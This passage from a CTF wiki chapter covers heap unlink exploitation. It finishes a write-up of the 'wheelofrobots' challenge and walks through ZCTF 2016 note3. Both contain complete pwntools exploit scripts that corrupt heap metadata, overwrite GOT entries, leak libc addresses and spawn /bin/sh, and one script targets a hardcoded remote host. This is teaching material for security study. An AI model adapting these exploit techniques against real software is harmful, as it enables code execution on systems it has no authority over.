2. Allocate physically adjacent chunks of appropriate sizes, including destructor. Using the arbitrary-length heap overflow vulnerability above, overflow destructor's corresponding chunk into the next physically adjacent chunk, thereby achieving the effect of unlinking the fake chunk at 0x6030E8. At this point, the destructor in the bss segment points to 0x6030D0. This allows us to overwrite nearly all content in the bss segment again.
3. Construct an arbitrary address write vulnerability. Through the above vulnerability, overwrite the allocated wheel 1 (tinny) pointer to destructor's address, so that editing tinny is equivalent to editing destructor's content, and then when we edit destructor again, it is equivalent to arbitrary low-address write.
4. Since the program only randomly outputs some wheel contents when the robot is finally started, and once output, the program exits — since we cannot control this part, we patch `exit()` to a `ret` address. This way, we can output content multiple times, thereby leaking some GOT table addresses. **Actually, since we have an arbitrary address write vulnerability, we could also write some GOT entry to puts's PLT address, so that calling the corresponding function would directly output the corresponding content. However, we won't use this method here, since it was already used in the HITCON stkof challenge above.**
5. After leaking the corresponding content, we can obtain the libc base address, system address, and /bin/sh address in libc. Then we modify free@got to the system address. When memory is freed again, a shell will be launched.

The code is as follows:

```python
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./wheelofrobots"
robots = ELF('./wheelofrobots')
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./wheelofrobots")
log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')


def offset_bin_main_arena(idx):
    word_bytes = context.word_size / 8
    offset = 4  # lock
    offset += 4  # flags
    offset += word_bytes * 10  # offset fastbin
    offset += word_bytes * 2  # top,last_remainder
    offset += idx * 2 * word_bytes  # idx
    offset -= word_bytes * 2  # bin overlap
    return offset


def add(idx, size=0):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Your choice :')
    p.sendline(str(idx))
    if idx == 2:
        p.recvuntil("Increase Bender's intelligence: ")
        p.sendline(str(size))
    elif idx == 3:
        p.recvuntil("Increase Robot Devil's cruelty: ")
        p.sendline(str(size))
    elif idx == 6:
        p.recvuntil("Increase Destructor's powerful: ")
        p.sendline(str(size))


def remove(idx):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Your choice :')
    p.sendline(str(idx))


def change(idx, name):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Your choice :')
    p.sendline(str(idx))
    p.recvuntil("Robot's name: \n")
    p.send(name)


def start_robot():
    p.recvuntil('Your choice :')
    p.sendline('4')


def overflow_benderinuse(inuse):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Your choice :')
    p.send('9999' + inuse)


def write(where, what):
    change(1, p64(where))
    change(6, p64(what))


def exp():
    print "step 1"

    # add a fastbin chunk 0x20 and free it
    # so it is in fastbin, idx2->NULL
    add(2, 1)  # idx2
    remove(2)

    # overflow bender inuse with 1
    overflow_benderinuse('\x01')

    # change bender's fd to 0x603138, point to bender's size
    # now fastbin 0x20, idx2->0x603138->NULL
    change(2, p64(0x603138))

    # in order add bender again
    overflow_benderinuse('\x00')

    # add bender again, fastbin 0x603138->NULL
    add(2, 1)

    # in order to malloc chunk at 0x603138
    # we need to bypass the fastbin size check, i.e. set *0x603140=0x20
    # it is at Robot Devil
    add(3, 0x20)

    # trigger malloc, set tinny point to 0x603148
    add(1)

    # wheels must <= 3
    remove(2)
    remove(3)

    print 'step 2'

    # alloc Destructor size 60->0x50, chunk content 0x40
    add(6, 3)

    # alloc devil, size=20*7=140, bigger than fastbin
    add(3, 7)

    # edit destructor's size to 1000 by tinny
    change(1, p64(1000))

    # place fake chunk at destructor's pointer
    fakechunk_addr = 0x6030E8
    fakechunk = p64(0) + p64(0x20) + p64(fakechunk_addr - 0x18) + p64(
        fakechunk_addr - 0x10) + p64(0x20)
    fakechunk = fakechunk.ljust(0x40, 'a')
    fakechunk += p64(0x40) + p64(0xa0)
    change(6, fakechunk)

    # trigger unlink
    remove(3)

    print 'step 3'

    # make 0x6030F8 point to 0x6030E8
    payload = p64(0) * 2 + 0x18 * 'a' + p64(0x6030E8)
    change(6, payload)

    print 'step 4'

    # make exit just as return
    write(robots.got['exit'], 0x401954)

    print 'step 5'

    # set wheel cnt =3, 0x603130 in order to start robot
    write(0x603130, 3)

    # set destructor point to puts@got
    change(1, p64(robots.got['puts']))
    start_robot()
    p.recvuntil('New hands great!! Thx ')
    puts_addr = p.recvuntil('!\n', drop=True).ljust(8, '\x00')
    puts_addr = u64(puts_addr)
    log.success('puts addr: ' + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    log.success('libc base: ' + hex(libc_base))
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search('/bin/sh'))

    # make free->system
    write(robots.got['free'], system_addr)

    # make destructor point to /bin/sh addr
    write(0x6030E8, binsh_addr)

    # get shell
    remove(6)
    p.interactive()


if __name__ == "__main__":
    exp()

```

### Challenges

- [DEFCON 2017 Qualifiers beatmeonthedl](https://github.com/Owlz/CTF/raw/master/2017/DEFCON/beatmeonthedl/beatmeonthedl)

### References

- malloc@angelboy
- https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a


## note3
[Challenge link](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/ZCTF_2016_note3)

### Introduction

A challenge from ZCTF 2016, testing safe unlink exploitation.

### Challenge Description

The challenge is a notepad that provides the ability to create, delete, edit, and view notes.

```
1.New note
2.Show note
3.Edit note
4.Delete note
5.Quit
option--->>
```

Protections are as follows:

```
Canary                        : Yes
NX                            : Yes
PIE                           : No
Fortify                       : No
RelRO                         : Partial
```

### Function Overview

The program's New function is used to create notes. The note size can be customized as long as it is less than 1024 bytes.

```
int new()
{
  puts("Input the length of the note content:(less than 1024)");
  size = get_num();
  if ( size < 0 )
    return puts("Length error");
  if ( size > 1024 )
    return puts("Content is too long");
  heap_ptr = malloc(size);
  puts("Input the note content:");
  my_read(heap_ptr, size, '\n');
  bss_ptr[i] = heap_ptr;
  current_ptr[i + 8LL] = size;
  current_ptr[0] = bss_ptr[i];
  return printf("note add success, the id is %d\n", i);
}
```

All the malloc'd pointers for notes are stored in the global array bss_ptr on the bss segment. This array can store up to 8 heap_ptrs.
The size corresponding to each heap_ptr is also stored in the bss_ptr array. current_ptr represents the current note. The bss layout is as follows.

```
.bss:
current_ptr
note0_ptr
note1_ptr
note2_ptr
note3_ptr
note4_ptr
note5_ptr
note6_ptr
note7_ptr
note0_size
note1_size
note2_size
note3_size
note4_size
note5_size
note6_size
note7_size
```

The Show function is useless. Edit and delete can edit and free notes respectively.

### Vulnerability

The vulnerability exists in the edit function. After obtaining the user-input id, no validation is performed. If the input id is negative, it can still be executed.
There is an integer overflow vulnerability in the get_num function, which allows us to obtain a negative number.

```
int edit()
{

  id = get_num();
  data_ptr = ptr[id];
  if ( data_ptr )
  {
    puts("Input the new content:");
    my_read(ptr[id], current_ptr[id + 8], '\n');
    current_ptr[0] = ptr[id];
    data_ptr = puts("Edit success");
  }
}
```

Therefore, we can make edit read into current_ptr, using note7_ptr as the size.
```
.bss:
current_ptr <== edit ptr
note0_ptr
note1_ptr
note2_ptr
note3_ptr
note4_ptr
note5_ptr
note6_ptr
note7_ptr   <== size
note0_size
note1_size
note2_size
note3_size
note4_size
note5_size
note6_size
note7_size
```
First create 8 notes, then edit note3 to make current_ptr point to note3, then use -1 to overflow note3.
```
new(512,'a')
new(512,'a')
new(512,'a')
new(512,'a')
new(512,'a')
new(512,'a')
new(512,'a')
new(512,'a')

edit(3,'a')
edit(-9223372036854775808,data);
```

The overflow data we use is to construct a fake chunk to implement safe unlink exploitation. The specific principle can be found in this chapter's explanation.

```
data = ''
data += p64(0) + p64(512+1) #fake chunk header
data += p64(0x6020e0-0x18) + p64(0x6020e0-0x10) #fake fd and bk
data += 'A'*(512-32)
data += p64(512) + p64(512+16)
```

After freeing note4, note3 and note4 will be consolidated. note3_ptr will point to the location of note0_ptr. This way, by continuously modifying note0_ptr's value and editing note0, we can achieve arbitrary address write.

However, the challenge does not provide a show function, so arbitrary address read is not possible, meaning data cannot be leaked.
The approach used here is to change free's GOT entry to printf's value, then write "%x" in a blank area of bss.
This way, when freeing this area (this area is in ptr_array, so it can be directly passed to free), stack data can be leaked.
By calculating system's address from the libc address on the stack, we can use arbitrary address write to get a shell.

```
free(4)

edit(3,free_got)
edit(0,printf_plt)

edit(3,p64(0x6020e8))
edit(0,'%llx.'*30)
```
The complete exploit is as follows:

```
#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *
import time
def malloc(size,data):
    print conn.recvuntil('>>')
    conn.sendline('1')
    print conn.recvuntil('1024)')
    conn.sendline(str(size))
    print conn.recvuntil('content:')
    conn.sendline(data)
    print conn.recvuntil('\n')
def edit(id,data):
    print conn.recvuntil('>>')
    conn.sendline('3')
    print conn.recvuntil('note:')
    conn.sendline(str(id))
    print conn.recvuntil('ent:')
    conn.sendline(data)
    print conn.recvuntil('success')
def free(id):
    print conn.recvuntil('>>')
    conn.sendline('4')
    print conn.recvuntil('note:')
    conn.sendline(str(id))
    print conn.recvuntil('success')

conn = remote('115.28.27.103',9003)
free_got = p64(0x602018)
puts_got = p64(0x602020)
stack_got = p64(0x602038)
printf_got = p64(0x602030)
exit_got = p64(0x602078)
printf_plt = p64(0x400750)
puts_plt = p64(0x400730)

#libcstartmain_ret_off = 0x21b45
#sys_off = 0x414f0

libcstartmain_ret_off = 0x21ec5
sys_off = 0x46640

# 1. int overflow lead to double free
intoverflow = -9223372036854775808
malloc(512,'/bin/sh\0')
malloc(512,'/bin/sh\0')
malloc(512,'/bin/sh\0')
malloc(512,'/bin/sh\0')
malloc(512,'/bin/sh\0')
malloc(512,'/bin/sh\0')
malloc(512,p64(0x400ef8))
malloc(512,'/bin/sh\0')

# 2. make a fake chunk and modify the next chunk's pre size
fakechunk = p64(0) + p64(512+1) + p64(0x6020e0-0x18) + p64(0x6020e0-0x10) + 'A'*(512-32) + p64(512) + p64(512+16)
edit(3,'aaaaaa')
edit(intoverflow,fakechunk)

# 3. double free
free(4)

# 4. overwrite got
edit(3,free_got)
edit(0,printf_plt+printf_plt)

# 5. leak the stack data
edit(3,p64(0x6020e8))
edit(0,'%llx.'*30)

# free->puts
print conn.recvuntil('>>')
conn.sendline('4')
print conn.recvuntil('note:')
conn.sendline(str(0))

ret =  conn.recvuntil('success')
print ret

# 6. calcuate the system's addr
libcstart = ret.split('.')[10]
libcstart_2 = int(libcstart,16) - libcstartmain_ret_off
print 'libc start addr:',hex(libcstart_2)
system_addr = libcstart_2 + sys_off
print 'system_addr:',hex(system_addr)

# 7. overwrite free's got
edit(3,free_got)
edit(0,p64(system_addr)+printf_plt)

# 8. write argv
edit(3,p64(0x6020d0))
edit(0,'/bin/sh\0')

# 9. exploit
print conn.recvuntil('>>')
conn.sendline('4')
print conn.recvuntil('note:')
conn.sendline(str(0))
sleep(0.2)
conn.interactive()
```